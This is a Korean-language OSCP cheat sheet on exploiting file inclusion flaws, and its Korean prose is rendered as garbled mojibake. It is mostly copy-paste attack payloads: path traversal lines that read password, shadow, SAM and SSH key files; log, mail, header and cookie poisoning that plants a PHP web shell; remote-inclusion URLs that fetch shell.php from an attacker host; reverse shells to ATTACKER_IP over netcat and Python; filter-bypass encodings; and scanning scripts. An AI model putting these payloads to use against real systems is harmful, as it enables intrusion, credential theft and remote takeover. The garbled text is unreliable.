# File Inclusion (LFI/RFI) - OSCP ê³µê²© ê°€ì´ë“œ

> **ëª©í‘œ: íŒŒì¼ í¬í•¨ ì·¨ì•½ì ì„ í†µí•œ ì •ë³´ ìˆ˜ì§‘ â†’ ì½”ë“œ ì‹¤í–‰ â†’ ì‰˜ íšë“**

## âš¡ ê¸°ë³¸ í˜ì´ë¡œë“œë“¤ (ì¦‰ì‹œ ë³µì‚¬-ë¶™ì—¬ë„£ê¸°)

### ğŸ” ê¸°ë³¸ LFI í…ŒìŠ¤íŠ¸

```bash
# ê¸°ë³¸ LFI í˜ì´ë¡œë“œ (ë¦¬ëˆ…ìŠ¤)
../../../../../../../etc/passwd
../../../../../../../etc/shadow
../../../../../../../etc/hosts
../../../../../../../etc/issue
../../../../../../../proc/version
../../../../../../../proc/cmdline

# ê¸°ë³¸ LFI í˜ì´ë¡œë“œ (ìœˆë„ìš°)
..\..\..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\..\..\windows\system32\config\sam
..\..\..\..\..\..\windows\win.ini
..\..\..\..\..\..\windows\system32\config\system
..\..\..\..\..\..\windows\repair\sam
..\..\..\..\..\..\windows\php.ini

# ì›¹ ì„œë²„ ì„¤ì • íŒŒì¼
../../../../../../../etc/apache2/apache2.conf
../../../../../../../etc/nginx/nginx.conf
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/nginx/access.log
../../../../../../../etc/httpd/conf/httpd.conf
```

### ğŸŒ RFI ê¸°ë³¸ í…ŒìŠ¤íŠ¸

```bash
# ê¸°ë³¸ RFI í˜ì´ë¡œë“œ
http://{ATTACKER_IP}/shell.php
https://{ATTACKER_IP}/shell.php
ftp://{ATTACKER_IP}/shell.php
///{ATTACKER_IP}/shell.php
\\{ATTACKER_IP}\shell.php

# ì™¸ë¶€ ì‰˜ URL (í…ŒìŠ¤íŠ¸ìš©)
http://www.google.com/humans.txt
https://pastebin.com/raw/
https://github.com/user/repo/raw/main/shell.php
```

### ğŸ“„ ì¤‘ìš” íŒŒì¼ ìœ„ì¹˜

```bash
# SSH í‚¤ íŒŒì¼
../../../../../../../home/{USER}/.ssh/id_rsa
../../../../../../../home/{USER}/.ssh/id_dsa
../../../../../../../home/{USER}/.ssh/authorized_keys
../../../../../../../root/.ssh/id_rsa

# ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì„¤ì •
../../../../../../../var/www/html/config.php
../../../../../../../var/www/html/wp-config.php
../../../../../../../var/www/html/configuration.php
../../../../../../../var/www/html/.env

# ë°ì´í„°ë² ì´ìŠ¤ ì„¤ì •
../../../../../../../etc/mysql/my.cnf
../../../../../../../var/lib/mysql/mysql/user.MYD
```

## ğŸ¯ ìƒí™©ë³„ í˜ì´ë¡œë“œ

### ğŸ“ Log Poisoning (ê°€ì¥ íš¨ê³¼ì )

```bash
# 1. Apache ë¡œê·¸ ì ‘ê·¼ í™•ì¸
../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/httpd/access_log
../../../../../../../var/log/httpd/error_log

# 2. User-Agent í¬ì´ì¦ˆë‹
curl -A "<?php system(\$_GET['cmd']); ?>" http://{TARGET_IP}/

# 3. ë¡œê·¸ í¬ì´ì¦ˆë‹ëœ íŒŒì¼ ì ‘ê·¼
../../../../../../../var/log/apache2/access.log&cmd=whoami
../../../../../../../var/log/apache2/access.log&cmd=id
../../../../../../../var/log/apache2/access.log&cmd=cat%20/etc/passwd

# 4. ë¦¬ë²„ìŠ¤ ì‰˜
../../../../../../../var/log/apache2/access.log&cmd=nc%20-e%20/bin/sh%20{ATTACKER_IP}%20443
../../../../../../../var/log/apache2/access.log&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])%27
```

### ğŸ”§ PHP Wrapper í™œìš©

```bash
# Base64 ì¸ì½”ë”©ìœ¼ë¡œ ì†ŒìŠ¤ì½”ë“œ ì½ê¸°
php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/config.php
php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/index.php

# ì••ì¶• í•„í„° ì‚¬ìš©
php://filter/zlib.deflate/convert.base64-encode/resource=../../../../../../../etc/passwd

# ROT13 ì¸ì½”ë”©
php://filter/read=string.rot13/resource=../../../../../../../etc/passwd

# PHP input ìŠ¤íŠ¸ë¦¼ (POST ë°ì´í„°)
php://input
```

### ğŸ“§ ë©”ì¼ ë¡œê·¸ í¬ì´ì¦ˆë‹

```bash
# 1. ë©”ì¼ ë¡œê·¸ í™•ì¸
../../../../../../../var/log/mail.log
../../../../../../../var/spool/mail/www-data

# 2. ë©”ì¼ ì „ì†¡ìœ¼ë¡œ í¬ì´ì¦ˆë‹
telnet {TARGET_IP} 25
MAIL FROM: <?php system($_GET['cmd']); ?>
QUIT

# 3. í¬ì´ì¦ˆë‹ëœ ë¡œê·¸ ì ‘ê·¼
../../../../../../../var/log/mail.log&cmd=whoami
```

### ğŸ—‚ï¸ RFI ì‰˜ ì—…ë¡œë“œ

```bash
# 1. ê³µê²©ì ì„œë²„ì— ì‰˜ íŒŒì¼ ì¤€ë¹„
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# 2. RFIë¡œ ì‰˜ ì‹¤í–‰
http://{ATTACKER_IP}/shell.php&cmd=whoami
http://{ATTACKER_IP}/shell.php&cmd=id
http://{ATTACKER_IP}/shell.php&cmd=cat%20/etc/passwd

# 3. ë¦¬ë²„ìŠ¤ ì‰˜
http://{ATTACKER_IP}/shell.php&cmd=nc%20-e%20/bin/sh%20{ATTACKER_IP}%20443
```

## ğŸ”„ ìš°íšŒ ê¸°ë²•ë“¤

### ğŸš« ê²½ë¡œ ìˆœíšŒ í•„í„° ìš°íšŒ

```bash
# ì ê³¼ ìŠ¬ë˜ì‹œ í•„í„° ìš°íšŒ
....//....//....//....//....//....//etc/passwd
..\/..\/..\/..\/..\/..\/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd

# Null byte ìš°íšŒ (êµ¬ë²„ì „ PHP)
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00.jpg

# ì´ì¤‘ ì¸ì½”ë”©
%252e%252e%252f%252e%252e%252f%252e%252e%252f%etc%252fpasswd

# ìœ ë‹ˆì½”ë“œ ìš°íšŒ
..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### ğŸ”¤ í™•ì¥ì í•„í„° ìš°íšŒ

```bash
# í™•ì¥ìê°€ ìë™ìœ¼ë¡œ ë¶™ëŠ” ê²½ìš°
../../../../../../../etc/passwd/.
../../../../../../../etc/passwd/./
../../../../../../../etc/passwd%00
../../../../../../../etc/passwd?
../../../../../../../etc/passwd#

# PHP wrapperë¡œ ìš°íšŒ
php://filter/resource=../../../../../../../etc/passwd
expect://id
data://text/plain,<?php system($_GET['cmd']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### ğŸ›¡ï¸ WAF/í•„í„° ìš°íšŒ

```bash
# í‚¤ì›Œë“œ í•„í„° ìš°íšŒ
../../../../../../../e%74c/p%61sswd
../../../../../../../etc/pass%77d
../../../../../../../etc/pas'+'swd

# ê²½ë¡œ ì •ê·œí™” ìš°íšŒ
../../../../../../../etc/./passwd
../../../../../../../etc/passwd/.
../../../../../../../etc//passwd

# ëŒ€ì†Œë¬¸ì ìš°íšŒ
../../../../../../../ETC/PASSWD
../../../../../../../Etc/Passwd

# íŠ¹ìˆ˜ë¬¸ì ì‚½ì…
..././..././..././..././etc/passwd
..\\..\\..\\..\\..\\..\\.\\etc\\passwd
```

### ğŸŒ RFI ìš°íšŒ ê¸°ë²•

```bash
# í”„ë¡œí† ì½œ ìš°íšŒ
ftp://{ATTACKER_IP}/shell.php
tftp://{ATTACKER_IP}/shell.php
ldap://{ATTACKER_IP}/shell.php

# í¬íŠ¸ ë³€ê²½
http://{ATTACKER_IP}:8080/shell.php
https://{ATTACKER_IP}:8443/shell.php

# IP ì¸ì½”ë”©
http://2130706433/shell.php  # 127.0.0.1ì˜ 10ì§„ìˆ˜
http://0x7f000001/shell.php  # 127.0.0.1ì˜ 16ì§„ìˆ˜
```

## ğŸ¤– ìë™í™” ë„êµ¬ ëª…ë ¹ì–´

### ğŸ” DotDotPwn

```bash
# ê¸°ë³¸ ìŠ¤ìº”
dotdotpwn -m http -h {TARGET_IP} -M GET -o unix

# íŠ¹ì • íŒŒë¼ë¯¸í„° í…ŒìŠ¤íŠ¸
dotdotpwn -m http -h {TARGET_IP} -M GET -o unix -f /etc/passwd -k "file="

# POST ë©”ì†Œë“œë¡œ í…ŒìŠ¤íŠ¸
dotdotpwn -m http -h {TARGET_IP} -M POST -o unix -d "file=TRAVERSAL"

# ì›Œë“œë¦¬ìŠ¤íŠ¸ ì‚¬ìš©
dotdotpwn -m http -h {TARGET_IP} -M GET -o unix -S -t 300 -f /etc/passwd
```

### ğŸ•·ï¸ Burp Suite Extension

```bash
# LFI Scanner ì‚¬ìš©ë²•
1. Burp Suite > Extender > BApp Store > LFI Scanner ì„¤ì¹˜
2. Target > Site map > ìš°í´ë¦­ > Extensions > LFI Scanner
3. ìë™ìœ¼ë¡œ LFI ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ ìˆ˜í–‰

# Manual Testing with Burp Intruder
1. íŒŒë¼ë¯¸í„° ì„ íƒ í›„ Send to Intruder
2. Payload Listsì— ../../../../../../../etc/passwd ë“± ì¶”ê°€
3. Attack ì‹¤í–‰ í›„ ê¸¸ì´ ì°¨ì´ë¡œ ì„±ê³µ ì—¬ë¶€ í™•ì¸
```

### ğŸ”§ ì»¤ìŠ¤í…€ ìŠ¤í¬ë¦½íŠ¸

```bash
# LFI ìë™ í…ŒìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸
#!/bin/bash
TARGET="$1"
PARAM="$2"

PAYLOADS=(
    "../../../../../../../etc/passwd"
    "../../../../../../../etc/shadow"
    "../../../../../../../var/log/apache2/access.log"
    "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
    echo "[+] Testing: $payload"
    curl -s "$TARGET?$PARAM=$payload" | grep -E "(root:|www-data:|daemon:)" && echo "[SUCCESS] $payload"
done
```

### ğŸ Python ìŠ¤í¬ë¦½íŠ¸

```python
#!/usr/bin/env python3
import requests
import sys

def test_lfi(url, param):
    payloads = [
        "../../../../../../../etc/passwd",
        "../../../../../../../etc/shadow",
        "php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd",
        "../../../../../../../var/log/apache2/access.log"
    ]

    for payload in payloads:
        try:
            r = requests.get(f"{url}?{param}={payload}", timeout=10)
            if "root:" in r.text or "www-data:" in r.text:
                print(f"[SUCCESS] {payload}")
                print(f"Response: {r.text[:200]}...")
        except:
            pass

if __name__ == "__main__":
    test_lfi(sys.argv[1], sys.argv[2])
```

## ğŸš¨ ë¬¸ì œ í•´ê²°

### âŒ LFIê°€ ì•ˆ ë  ë•Œ

```bash
# 1. ë‹¤ë¥¸ íŒŒë¼ë¯¸í„° í™•ì¸
?file=test
?page=test
?include=test
?path=test
?template=test
?doc=test

# 2. ë‹¤ë¥¸ ê²½ë¡œ ì‹œë„
/etc/passwd
etc/passwd
../../../../etc/passwd
..//..//..//..//etc//passwd

# 3. ë‹¤ë¥¸ ì¤‘ìš” íŒŒì¼ë“¤
/etc/issue
/etc/hostname
/etc/os-release
/proc/self/environ
/proc/version
/proc/cmdline

# 4. ì›¹ ì„œë²„ë³„ ë¡œê·¸ ìœ„ì¹˜
# Apache
/var/log/apache2/access.log
/var/log/httpd/access_log
/usr/local/apache/logs/access_log

# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### ğŸ”„ RFIê°€ ì•ˆ ë  ë•Œ

```bash
# 1. allow_url_include í™•ì¸
php://filter/convert.base64-encode/resource=../../../../../../../etc/php/7.4/apache2/php.ini

# 2. ë‹¤ë¥¸ í”„ë¡œí† ì½œ ì‹œë„
ftp://{ATTACKER_IP}/shell.txt
tftp://{ATTACKER_IP}/shell.txt
\\{ATTACKER_IP}\share\shell.txt

# 3. í¬íŠ¸ ë³€ê²½
http://{ATTACKER_IP}:8080/shell.php
http://{ATTACKER_IP}:3000/shell.php

# 4. ì™¸ë¶€ ì„œë¹„ìŠ¤ í™œìš©
https://pastebin.com/raw/xxxxxxxx
https://gist.githubusercontent.com/user/xxx/raw/shell.php
```

### ğŸ› ï¸ ë¡œê·¸ í¬ì´ì¦ˆë‹ì´ ì•ˆ ë  ë•Œ

```bash
# 1. ë‹¤ë¥¸ ë¡œê·¸ íŒŒì¼ ì‹œë„
/var/log/auth.log (SSH ë¡œê·¸)
/var/log/vsftpd.log (FTP ë¡œê·¸)
/var/log/mail.log (ë©”ì¼ ë¡œê·¸)

# 2. SSH ë¡œê·¸ í¬ì´ì¦ˆë‹
ssh '<?php system($_GET[cmd]); ?>'@{TARGET_IP}

# 3. ë‹¤ë¥¸ í—¤ë”ë¡œ í¬ì´ì¦ˆë‹
curl -H "X-Forwarded-For: <?php system(\$_GET['cmd']); ?>" http://{TARGET_IP}/

# 4. ì¿ í‚¤ í¬ì´ì¦ˆë‹
curl --cookie "user=<?php system(\$_GET['cmd']); ?>" http://{TARGET_IP}/
```

### ğŸ” í•„í„°ê°€ ê°•í•  ë•Œ

```bash
# 1. ë‹¤ì¸µ ì¸ì½”ë”©
%252e%252e%252f  (ì´ì¤‘ URL ì¸ì½”ë”©)

# 2. ë‹¤ë¥¸ wrapper ì‹œë„
compress.zlib://
compress.bzip2://
zip://

# 3. ì„¸ì…˜ íŒŒì¼ ì½ê¸°
/tmp/sess_{SESSION_ID}
/var/lib/php/sessions/sess_{SESSION_ID}

# 4. proc íŒŒì¼ì‹œìŠ¤í…œ í™œìš©
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
/proc/self/environ
```

## ğŸ“Š ì„±ê³µ íŒì • ê¸°ì¤€

### âœ… LFI ì„±ê³µ í™•ì¸

- `/etc/passwd` ë‚´ìš© í™•ì¸: `root:x:0:0:` í¬í•¨
- ë¡œê·¸ íŒŒì¼ ì½ê¸°: Apache/Nginx ë¡œê·¸ í˜•ì‹ í™•ì¸
- ì„¤ì • íŒŒì¼: `<?php` ë˜ëŠ” ì„¤ì • ê°’ë“¤ í™•ì¸
- Base64 ì¸ì½”ë”©: ë””ì½”ë”© í›„ ì˜ë¯¸ìˆëŠ” ë‚´ìš© í™•ì¸

### âœ… RFI ì„±ê³µ í™•ì¸

- ì™¸ë¶€ íŒŒì¼ ì‹¤í–‰: `phpinfo()` ê²°ê³¼ í‘œì‹œ
- ì‰˜ ì‹¤í–‰: `whoami`, `id` ëª…ë ¹ì–´ ê²°ê³¼
- ì—ëŸ¬ ë©”ì‹œì§€: ì™¸ë¶€ URL ì ‘ê·¼ ì‹œë„ í™•ì¸

### â° ì‹œê°„ ê´€ë¦¬

- **5ë¶„**: ê¸°ë³¸ LFI í˜ì´ë¡œë“œ í…ŒìŠ¤íŠ¸
- **15ë¶„**: ë¡œê·¸ í¬ì´ì¦ˆë‹ + RFI ì‹œë„
- **25ë¶„**: ê³ ê¸‰ ìš°íšŒ ê¸°ë²• + wrapper í™œìš©
- **30ë¶„**: ë‹¤ë¥¸ ê³µê²©ìœ¼ë¡œ ì „í™˜

**ì„±ê³µì‹œ ì¦‰ì‹œ ì‰˜ íšë“ìœ¼ë¡œ ì´ë™!** â†’ `SHELLS/reverse-shells.md`
